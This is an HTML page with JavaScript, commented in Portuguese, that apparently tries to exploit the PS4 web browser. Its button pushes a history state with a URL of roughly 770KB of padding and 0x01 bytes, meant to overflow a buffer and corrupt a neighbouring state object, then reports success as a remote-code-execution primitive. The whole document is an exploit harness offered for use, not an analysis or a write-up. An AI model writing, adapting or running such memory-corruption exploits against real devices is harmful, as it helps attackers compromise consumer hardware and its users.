<!DOCTYPE html>
<html>
<head>
    <title>PS4 History State Attack</title>
    <style>
        body { background-color: #000; color: #ffaa00; font-family: monospace; padding: 20px; }
        button { font-size: 20px; padding: 15px; width: 100%; border: 2px solid #ffaa00; background: #222; color: #fff; cursor: pointer; }
        #log { border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; color: cyan; }
    </style>
</head>
<body>

    <h1>Estratégia: State Object Corruption</h1>
    <p>Tentando corromper o objeto 'state' vizinho.</p>

    <button onclick="startStateAttack()">INICIAR ATAQUE STATE</button>
    <div id="log">Pronto.</div>

    <script>
        const BASE_OFFSET = 709522;
        const OVERFLOW_AMT = 1024 * 64; 

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += `<div>${msg}</div>`;
        }

        function startStateAttack() {
            log("1. Preparando objeto de Estado Gigante...");

            // Cria um objeto grande para tentar forçar alocação no Heap Grande
            // Usamos uma string repetitiva dentro do objeto
            let targetData = "B".repeat(1024 * 512); // 512KB
            let stateObj = { 
                id: "TARGET_VICTIM", 
                payload: targetData 
            };

            log("2. Injetando Estado + Overflow na URL...");

            setTimeout(() => {
                try {
                    // Payload da URL
                    let buffer = "A".repeat(BASE_OFFSET) + "\x01".repeat(OVERFLOW_AMT);

                    // A MÁGICA: Passamos o objeto E a URL corrupta juntos
                    // Esperamos que o sistema grave o objeto, e depois a URL transborde em cima dele
                    history.pushState(stateObj, "state_pwn", "/" + buffer);

                    log("3. Verificando history.state...");
                    
                    // Lê de volta
                    let currentState = history.state;
                    
                    if (!currentState) {
                        log("Erro: Estado perdido (Crash evitado?)");
                        return;
                    }

                    // Verifica se a string dentro do objeto foi alterada
                    // Se o primeiro caractere virou 0x01
                    if (currentState.payload.charCodeAt(0) === 1) {
                         log("<h2 style='color:#0f0'>!!! SUCESSO !!! STATE CORROMPIDO</h2>");
                         alert("RCE PRIMITIVE FOUND!");
                    } else {
                        log("Estado intacto. O overflow não atingiu o objeto local.");
                    }

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }
    </script>
</body>
</html>
